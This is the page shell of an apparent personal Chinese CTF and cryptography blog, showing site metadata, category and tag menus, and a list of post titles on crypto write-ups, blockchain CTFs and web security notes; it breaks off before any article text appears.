<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <title>Linux 基础 | Van1sh的小屋</title>
  <meta name="keywords" content=" Linux ">
  <meta name="description" content="Linux 基础 | Van1sh的小屋">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="&amp;emsp;&amp;emsp; Van1sh，也用ID：V、Vanish，主要是有的网站昵称至少两个字符，Vanish也容易被注册&amp;emsp;现就读于杭州电子科技大学。是一只究极大菜鸡加懒狗。自2019.2.14的2019Hctf-Game接触CTF，由于零基础，目前还菜的一批，可能还会继续菜下去。现在还只会做一点Crypto方向的题，其他什么Web，Pwn，Reverse, Misc….俺都不知道。">
<meta property="og:type" content="website">
<meta property="og:title" content="Van1sh的小屋">
<meta property="og:url" content="http://jayxv.github.io/about/index.html">
<meta property="og:site_name" content="Van1sh的小屋">
<meta property="og:description" content="&amp;emsp;&amp;emsp; Van1sh，也用ID：V、Vanish，主要是有的网站昵称至少两个字符，Vanish也容易被注册&amp;emsp;现就读于杭州电子科技大学。是一只究极大菜鸡加懒狗。自2019.2.14的2019Hctf-Game接触CTF，由于零基础，目前还菜的一批，可能还会继续菜下去。现在还只会做一点Crypto方向的题，其他什么Web，Pwn，Reverse, Misc….俺都不知道。">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2020-04-30T11:44:36.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Van1sh的小屋">
<meta name="twitter:description" content="&amp;emsp;&amp;emsp; Van1sh，也用ID：V、Vanish，主要是有的网站昵称至少两个字符，Vanish也容易被注册&amp;emsp;现就读于杭州电子科技大学。是一只究极大菜鸡加懒狗。自2019.2.14的2019Hctf-Game接触CTF，由于零基础，目前还菜的一批，可能还会继续菜下去。现在还只会做一点Crypto方向的题，其他什么Web，Pwn，Reverse, Misc….俺都不知道。">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/sublime.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>

<script src="/js/iconfont.js?v=1.0.1"></script>

</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value>
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>Van1sh</span>
</div>

<div class="icon">
    
        
    
        
        <a title="github" href="https://github.com/JayxV" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-github"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
        <a title="email" href="mailto:643713081@qq.com" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-email"></use>
                </svg>
            
        </a>
        
    
        
        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=643713081&site=qq&menu=yes" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-qq"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
</div>




<ul>
    <li><div class="all active">全部文章<small>(83)</small></div></li>
    
        
            
            <li><div data-rel="比赛小屋">比赛小屋<small>(35)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="工具小屋">工具小屋<small>(5)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="合约小屋"><i class="fold iconfont icon-right"></i>合约小屋<small>(8)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="contract">contract<small>(6)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="区块链靶场">区块链靶场<small>(1)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
            <li><div data-rel="密码小屋"><i class="fold iconfont icon-right"></i>密码小屋<small>(25)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="ECC">ECC<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Paillier">Paillier<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Lattice">Lattice<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Stream">Stream<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Knapsack">Knapsack<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Rsa">Rsa<small>(3)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Block">Block<small>(3)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Basic">Basic<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="CTF">CTF<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="RSA">RSA<small>(1)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
            <li><div data-rel="协议小屋">协议小屋<small>(2)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="Web小屋"><i class="fold iconfont icon-right"></i>Web小屋<small>(3)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="Files related">Files related<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="SQL">SQL<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="XSS">XSS<small>(1)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
            <li><div data-rel="逆向小屋"><i class="fold iconfont icon-right"></i>逆向小屋<small>(1)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="patch">patch<small>(1)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
        
    
        
            
            <li><div data-rel="论文小屋">论文小屋<small>(1)</small></div>
                
            </li>
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
            <li><div data-rel="漏洞小屋">漏洞小屋<small>(1)</small></div>
                
            </li>
            
        
    
        
            
        
    
        
            
        
    
        
            
            <li><div data-rel="小书屋">小书屋<small>(1)</small></div>
                
            </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="83">
<input type="hidden" id="yelog_site_word_count" value="373.3k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://www.fzwjscj.xyz/">fzwjscj</a></li>
            
            <li><a target="_blank" href="http://dldxz.cn/">DLDXZ</a></li>
            
            <li><a target="_blank" href="http://fanda.cloud/">fanda</a></li>
            
            <li><a target="_blank" href="http://passingfoam.com/">PassingFoam&#39;s blog</a></li>
            
            <li><a target="_blank" href="https://eqqie.cn/">赤道企鹅</a></li>
            
            <li><a target="_blank" href="http://blog.ragdoll.work/">咲夜南梦</a></li>
            
            <li><a target="_blank" href="https://www.zhaoj.in/">glzjin</a></li>
            
            <li><a target="_blank" href="https://coinc1dens.github.io/">Coinc1dens</a></li>
            
            <li><a target="_blank" href="http://blog.soreatu.com/">soreatu</a></li>
            
            <li><a target="_blank" href="http://www.ga1axy.top/">盖乐希</a></li>
            
            <li><a target="_blank" href="https://shawroot.cc/">Root.</a></li>
            
            <li><a target="_blank" href="https://l1near.top/">l1near</a></li>
            
            <li><a target="_blank" href="https://0xdktb.top/">0xDktb</a></li>
            
            <li><a target="_blank" href="https://www.wootec.top/">Reverier</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode === 13){return false;}">
        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a class="color4">Write Up</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">docker</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">Sage</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CTF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">Basic</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">ECC</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Paillier</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">Crypto</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">TLS 1.2</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Web</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">Files</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Serialization</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">Lattice</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Dsa</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">LCG</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Rc4</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">SM4</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Knapsack</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Rsa</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">DES</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">差分密码分析</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">RSA</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">continued_fraction</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">RE</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">paper</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">small private exponent</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">SQL</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">python</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">操作模式</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">number theory</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">Abstract algebra</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">SPN</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">线性密码分析</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">ETH</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">Shadowsocks</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">XSS</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">Nmap</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">Coppersmith’s Method</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">Linux</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">book</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        <a id="top" class=""
           href="/2023/08/14/微信公众号/"
           data-tag=""
           data-author="Van1sh" >
            <span class="post-title" title="关于微信公众号">关于微信公众号</span>
            <span class="post-date" title="2023-08-14 00:00:00">2023/08/14</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/10/23/好题分享系列 - 2023 香山杯 - strange_hash/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="好题分享系列 - 2023 香山杯 - strange_hash">好题分享系列 - 2023 香山杯 - strange_hash</span>
            <span class="post-date" title="2023-10-23 16:40:00">2023/10/23</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2023/10/17/密码学基础之格中难题与格基规约/"
           data-tag="Basic"
           data-author="Van1sh" >
            <span class="post-title" title="密码学基础之格中难题与格基规约">密码学基础之格中难题与格基规约</span>
            <span class="post-date" title="2023-10-17 09:02:00">2023/10/17</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/10/12/好题分享系列 - 2023 网信柏鹭杯 - fractRSA/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="好题分享系列 - 2023 网信柏鹭杯 - fractRSA">好题分享系列 - 2023 网信柏鹭杯 - fractRSA</span>
            <span class="post-date" title="2023-10-12 12:02:00">2023/10/12</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2023/10/08/密码学基础之格理论基础/"
           data-tag="Basic"
           data-author="Van1sh" >
            <span class="post-title" title="密码学基础之格理论基础">密码学基础之格理论基础</span>
            <span class="post-date" title="2023-10-08 12:45:00">2023/10/08</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/09/26/2023 陇剑杯线下赛/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 陇剑杯线下赛">2023 陇剑杯线下赛</span>
            <span class="post-date" title="2023-09-26 14:42:00">2023/09/26</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/09/21/2023 祥云杯决赛/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 祥云杯决赛">2023 祥云杯决赛</span>
            <span class="post-date" title="2023-09-21 11:47:00">2023/09/21</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/09/17/2023 江苏省数据安全竞赛/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 江苏省数据安全竞赛">2023 江苏省数据安全竞赛</span>
            <span class="post-date" title="2023-09-17 11:21:00">2023/09/17</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2023/09/13/密码学基础之线性代数Ⅱ/"
           data-tag="Basic"
           data-author="Van1sh" >
            <span class="post-title" title="密码学基础之线性代数Ⅱ">密码学基础之线性代数Ⅱ</span>
            <span class="post-date" title="2023-09-13 07:00:00">2023/09/13</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2023/09/06/密码学基础之线性代数Ⅰ/"
           data-tag="Basic"
           data-author="Van1sh" >
            <span class="post-title" title="密码学基础之线性代数Ⅰ">密码学基础之线性代数Ⅰ</span>
            <span class="post-date" title="2023-09-06 15:16:00">2023/09/06</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/09/04/2023 羊城杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 羊城杯">2023 羊城杯</span>
            <span class="post-date" title="2023-09-04 10:15:00">2023/09/04</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/09/02/2023 熵密杯 revenge/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 熵密杯 revenge">2023 熵密杯 revenge</span>
            <span class="post-date" title="2023-09-02 07:00:00">2023/09/02</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/09/01/2023 观安杯决赛/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 观安杯决赛">2023 观安杯决赛</span>
            <span class="post-date" title="2023-09-01 11:59:00">2023/09/01</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/08/28/2023 陇剑杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 陇剑杯">2023 陇剑杯</span>
            <span class="post-date" title="2023-08-28 14:40:00">2023/08/28</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/08/25/2023 观安杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 观安杯">2023 观安杯</span>
            <span class="post-date" title="2023-08-25 15:54:00">2023/08/25</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2023/08/23/密码学攻击之RSA：初见/"
           data-tag="RSA"
           data-author="Van1sh" >
            <span class="post-title" title="密码学攻击之RSA：初见">密码学攻击之RSA：初见</span>
            <span class="post-date" title="2023-08-23 10:43:00">2023/08/23</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2023/08/18/密码学基础之数论四大定理/"
           data-tag="Basic"
           data-author="Van1sh" >
            <span class="post-title" title="密码学基础之数论四大定理">密码学基础之数论四大定理</span>
            <span class="post-date" title="2023-08-18 09:00:00">2023/08/18</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/08/14/2023 NepCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 NepCTF">2023 NepCTF</span>
            <span class="post-date" title="2023-08-14 12:00:00">2023/08/14</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/08/14/2023 CCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 CryptoCTF">2023 CryptoCTF</span>
            <span class="post-date" title="2023-08-14 00:00:00">2023/08/14</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/08/11/2023 熵密杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 熵密杯">2023 熵密杯</span>
            <span class="post-date" title="2023-08-11 12:00:00">2023/08/11</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2023/08/04/密码学基础之抽象代数基础/"
           data-tag="Basic"
           data-author="Van1sh" >
            <span class="post-title" title="密码学基础之抽象代数基础">密码学基础之抽象代数基础</span>
            <span class="post-date" title="2023-08-04 12:00:00">2023/08/04</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/08/02/2023 ImaginaryCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 ImaginaryCTF">2023 ImaginaryCTF</span>
            <span class="post-date" title="2023-08-02 00:00:00">2023/08/02</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2023/07/28/密码学基础之进制与编码/"
           data-tag="Basic"
           data-author="Van1sh" >
            <span class="post-title" title="密码学基础之进制与编码">密码学基础之进制与编码</span>
            <span class="post-date" title="2023-07-28 12:00:00">2023/07/28</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/07/24/2023 巅峰极客/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 巅峰极客-Rosita">2023 巅峰极客-Rosita</span>
            <span class="post-date" title="2023-07-24 01:00:00">2023/07/24</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/07/23/2023 DASCTF-0x401/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 DASCTF-0x401">2023 DASCTF-0x401</span>
            <span class="post-date" title="2023-07-23 00:00:00">2023/07/23</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2023/06/29/（我不懂）密码学系列之异或运算/"
           data-tag="Lattice"
           data-author="Van1sh" >
            <span class="post-title" title="（我不懂）密码学系列之异或运算">（我不懂）密码学系列之异或运算</span>
            <span class="post-date" title="2023-06-29 00:00:00">2023/06/29</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2023/06/15/2023 seectf/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2023 SEECTF">2023 SEECTF</span>
            <span class="post-date" title="2023-06-15 10:55:00">2023/06/15</span>
        </a>
        
        <a  class="漏洞小屋 "
           href="/2023/01/30/Shadowsocks Redirect Attack/"
           data-tag="Shadowsocks"
           data-author="Van1sh" >
            <span class="post-title" title="Shadowsocks Redirect Attack">Shadowsocks Redirect Attack</span>
            <span class="post-date" title="2023-01-30 17:14:00">2023/01/30</span>
        </a>
        
        <a  class="协议小屋 "
           href="/2022/12/15/TLS1.2协议分析（二）/"
           data-tag="TLS 1.2"
           data-author="Van1sh" >
            <span class="post-title" title="TLS 1.2 协议（二）">TLS 1.2 协议（二）</span>
            <span class="post-date" title="2022-12-15 10:24:00">2022/12/15</span>
        </a>
        
        <a  class="协议小屋 "
           href="/2022/12/08/TLS1.2协议分析（一）/"
           data-tag="TLS 1.2"
           data-author="Van1sh" >
            <span class="post-title" title="TLS 1.2 协议（一）">TLS 1.2 协议（一）</span>
            <span class="post-date" title="2022-12-08 21:10:00">2022/12/08</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2022/11/15/密码学学习笔记之连分数/"
           data-tag="continued_fraction"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记之连分数">密码学学习笔记之连分数</span>
            <span class="post-date" title="2022-11-15 17:59:00">2022/11/15</span>
        </a>
        
        <a  class="论文小屋 "
           href="/2022/10/17/Generalization of Some Attacks on RSA with Small Prime Combination and Small Private Exponent/"
           data-tag="paper,small private exponent"
           data-author="Van1sh" >
            <span class="post-title" title="Generalization of Some Attacks on RSA with Small Prime Combination and Small Private Exponent">Generalization of Some Attacks on RSA with Small Prime Combination and Small Private Exponent</span>
            <span class="post-date" title="2022-10-17 15:31:00">2022/10/17</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2022/09/14/2022 cryptoctf/"
           data-tag=""
           data-author="Van1sh" >
            <span class="post-title" title="2022 CryptoCTF">2022 CryptoCTF</span>
            <span class="post-date" title="2022-09-14 17:16:00">2022/09/14</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2022/08/30/2021 cryptoctf/"
           data-tag=""
           data-author="Van1sh" >
            <span class="post-title" title="2021 CryptoCTF">2021 CryptoCTF</span>
            <span class="post-date" title="2022-08-30 13:30:00">2022/08/30</span>
        </a>
        
        <a  class="合约小屋 contract "
           href="/2022/06/29/区块链学习笔记之2022ACTF-bet2loss/"
           data-tag="CTF"
           data-author="Van1sh" >
            <span class="post-title" title="区块链学习笔记之2022ACTF—bet2loss">区块链学习笔记之2022ACTF—bet2loss</span>
            <span class="post-date" title="2022-06-29 15:23:00">2022/06/29</span>
        </a>
        
        <a  class="合约小屋 contract "
           href="/2022/04/19/区块链学习笔记之2022starCTF/"
           data-tag="CTF"
           data-author="Van1sh" >
            <span class="post-title" title="区块链学习笔记之2022starCTF——TreasureHunter">区块链学习笔记之2022starCTF——TreasureHunter</span>
            <span class="post-date" title="2022-04-19 15:23:00">2022/04/19</span>
        </a>
        
        <a  class="合约小屋 区块链靶场 "
           href="/2022/03/08/区块链靶场刷题之cpaturetheether/"
           data-tag="CTF"
           data-author="Van1sh" >
            <span class="post-title" title="cpature the ether">cpature the ether</span>
            <span class="post-date" title="2022-03-08 11:03:00">2022/03/08</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2022/02/28/2022 SUSCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2022 SUSCTF">2022 SUSCTF</span>
            <span class="post-date" title="2022-02-28 11:18:35">2022/02/28</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2022/02/22/2021TQLCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2022 TQLCTF">2022 TQLCTF</span>
            <span class="post-date" title="2022-02-22 22:22:22">2022/02/22</span>
        </a>
        
        <a  class="合约小屋 contract "
           href="/2022/02/18/区块链学习笔记之BalsnCTF 2019 Bank/"
           data-tag="CTF"
           data-author="Van1sh" >
            <span class="post-title" title="区块链学习笔记之Balsn CTF 2019 - Bank">区块链学习笔记之Balsn CTF 2019 - Bank</span>
            <span class="post-date" title="2022-02-18 14:45:00">2022/02/18</span>
        </a>
        
        <a  class="合约小屋 contract "
           href="/2022/02/15/区块链学习笔记之BalsnCTF 2020 IdleGame/"
           data-tag="CTF"
           data-author="Van1sh" >
            <span class="post-title" title="区块链学习笔记之BalsnCTF 2020 IdleGame">区块链学习笔记之BalsnCTF 2020 IdleGame</span>
            <span class="post-date" title="2022-02-15 15:39:00">2022/02/15</span>
        </a>
        
        <a  class="合约小屋 contract "
           href="/2022/02/11/区块链学习笔记之paradigm-CTF babysandbox/"
           data-tag="CTF"
           data-author="Van1sh" >
            <span class="post-title" title="区块链学习笔记之paradigm-CTF babysandbox">区块链学习笔记之paradigm-CTF babysandbox</span>
            <span class="post-date" title="2022-02-11 16:22:00">2022/02/11</span>
        </a>
        
        <a  class="合约小屋 contract "
           href="/2022/01/23/区块链学习笔记之RealWorld体验赛/"
           data-tag="CTF"
           data-author="Van1sh" >
            <span class="post-title" title="区块链学习笔记之RealWorld体验赛——TransferFrom">区块链学习笔记之RealWorld体验赛——TransferFrom</span>
            <span class="post-date" title="2022-01-23 00:11:00">2022/01/23</span>
        </a>
        
        <a  class="合约小屋 "
           href="/2021/12/22/区块链学习笔记之初探以太坊/"
           data-tag="ETH"
           data-author="Van1sh" >
            <span class="post-title" title="区块链学习笔记之初探以太坊">区块链学习笔记之初探以太坊</span>
            <span class="post-date" title="2021-12-22 10:16:00">2021/12/22</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2021/08/23/2021 祥云杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2021 祥云杯">2021 祥云杯</span>
            <span class="post-date" title="2021-08-23 14:07:00">2021/08/23</span>
        </a>
        
        <a  class="密码小屋 Block "
           href="/2021/08/06/密码学学习笔记之线性分析入门篇——EzSPN/"
           data-tag="SPN,线性密码分析"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 线性分析入门篇——EzSPN">密码学学习笔记 之 线性分析入门篇——EzSPN</span>
            <span class="post-date" title="2021-08-06 09:24:25">2021/08/06</span>
        </a>
        
        <a  class="密码小屋 Block "
           href="/2021/07/16/密码学学习笔记之差分分析入门篇——四轮DES/"
           data-tag="DES,差分密码分析"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 差分分析入门篇——四轮DES">密码学学习笔记 之 差分分析入门篇——四轮DES</span>
            <span class="post-date" title="2021-07-16 09:24:25">2021/07/16</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2021/04/04/2021HFCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2021 HFCTF">2021 HFCTF</span>
            <span class="post-date" title="2021-04-04 11:02:47">2021/04/04</span>
        </a>
        
        <a  class="逆向小屋 patch "
           href="/2021/03/27/逆向学习笔记之drinkSomeTea/"
           data-tag="RE"
           data-author="Van1sh" >
            <span class="post-title" title="逆向学习笔记 之 drinkSomeTea">逆向学习笔记 之 drinkSomeTea</span>
            <span class="post-date" title="2021-03-27 19:22:00">2021/03/27</span>
        </a>
        
        <a  class="密码小屋 "
           href="/2021/01/01/密码学学习笔记之密码学随笔/"
           data-tag="Crypto"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 密码学随笔">密码学学习笔记 之 密码学随笔</span>
            <span class="post-date" title="2021-01-01 00:00:00">2021/01/01</span>
        </a>
        
        <a  class="密码小屋 RSA "
           href="/2020/12/18/密码学学习笔记之RSA的一些套路/"
           data-tag="Rsa"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 RSA的一些套路">密码学学习笔记 之 RSA的一些套路</span>
            <span class="post-date" title="2020-12-18 14:32:00">2020/12/18</span>
        </a>
        
        <a  class="密码小屋 CTF "
           href="/2020/12/18/密码学学习笔记之CTF/"
           data-tag="CTF"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 CTF">密码学学习笔记 之 CTF</span>
            <span class="post-date" title="2020-12-18 00:00:00">2020/12/18</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/12/10/2020RoarCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 RoarCTF">2020 RoarCTF</span>
            <span class="post-date" title="2020-12-10 10:00:00">2020/12/10</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/11/04/2020ByteCTF&X-NUCA部分密码学题解/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 ByteCTF&amp;X-NUCA">2020 ByteCTF&amp;X-NUCA</span>
            <span class="post-date" title="2020-11-04 10:00:00">2020/11/04</span>
        </a>
        
        <a  class="密码小屋 Rsa "
           href="/2020/08/13/密码学学习笔记之coppersmith/"
           data-tag="Coppersmith’s Method"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 Coppersmith’s Method">密码学学习笔记 之 Coppersmith’s Method</span>
            <span class="post-date" title="2020-08-13 10:00:00">2020/08/13</span>
        </a>
        
        <a  class="Web小屋 Files related "
           href="/2020/08/09/Web学习笔记之文件与序列化/"
           data-tag="Web,Files,Serialization"
           data-author="Van1sh" >
            <span class="post-title" title="Web学习笔记 之 文件与序列化">Web学习笔记 之 文件与序列化</span>
            <span class="post-date" title="2020-08-09 14:16:00">2020/08/09</span>
        </a>
        
        <a  class="Web小屋 SQL "
           href="/2020/08/07/Web学习笔记之SQL注入/"
           data-tag="Web,SQL"
           data-author="Van1sh" >
            <span class="post-title" title="Web学习笔记 之 SQL注入">Web学习笔记 之 SQL注入</span>
            <span class="post-date" title="2020-08-07 13:18:00">2020/08/07</span>
        </a>
        
        <a  class="Web小屋 XSS "
           href="/2020/07/26/Web学习笔记之XSS/"
           data-tag="Web,XSS"
           data-author="Van1sh" >
            <span class="post-title" title="Web学习笔记 之 XSS">Web学习笔记 之 XSS</span>
